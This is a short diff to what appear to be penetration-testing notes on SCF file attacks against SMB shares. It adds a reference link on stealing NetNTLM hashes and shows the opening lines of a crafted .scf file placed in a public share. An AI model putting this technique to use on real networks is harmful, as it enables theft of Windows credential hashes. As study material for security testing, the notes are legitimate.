@@ -54,6 +54,7 @@ watch -d "ls /mnt/folder/public/*; /mnt/folder/otro*"
 
 SCF
 https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
+https://www.securify.nl/en/blog/living-off-the-land-stealing-netntlm-hashes/
 nano public/file.scf
 [Shell]
 Command=2
